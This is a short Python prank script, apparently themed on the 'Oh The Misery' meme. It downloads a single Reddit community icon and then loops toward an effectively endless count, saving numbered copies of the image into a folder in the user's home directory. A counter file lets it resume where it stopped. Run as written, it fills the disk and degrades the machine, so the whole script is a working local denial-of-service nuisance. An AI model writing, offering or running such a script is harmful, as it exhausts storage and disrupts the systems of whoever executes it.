import os, requests, time
from pathlib import Path
os.system('cls')

folder_path = os.path.expanduser('~')
folder_path = folder_path.replace('\\', '/')
folder_path += '/Oh The Misery/'
file_path = folder_path + 'Oh The Misery.txt'

p = os.path.exists(folder_path)
pp = os.path.exists(file_path)

if p == False:
    os.mkdir(folder_path)
elif p == True:
    pass
else:
    pass

if pp == False:
    pass
    e = open(file_path, 'w+')
    e.write('1')
    e.close()
elif pp == True:
    pass
else:
    pass

oh_the_misery = 'https://styles.redditmedia.com/t5_58bgsg/styles/communityIcon_ge578qj55ov71.png'

f = open(file_path, 'r')
numbers_of_oh_the_misery = int(f.read())

print(numbers_of_oh_the_misery)

def download_oh_the_misery():
    global numbers_of_oh_the_misery

    oh_the_misery_data = requests.get(oh_the_misery).content

    for i in range(numbers_of_oh_the_misery, 696969696969696969696969696969696969696969):
        with open(f'{folder_path}Oh The Misery {numbers_of_oh_the_misery}.png', 'wb') as handler:
            handler.write(oh_the_misery_data)
        numbers_of_oh_the_misery += 1
        pp = open(file_path, 'w')
        pp.write(str(numbers_of_oh_the_misery))
        f.close()
        pp.close()

download_oh_the_misery()
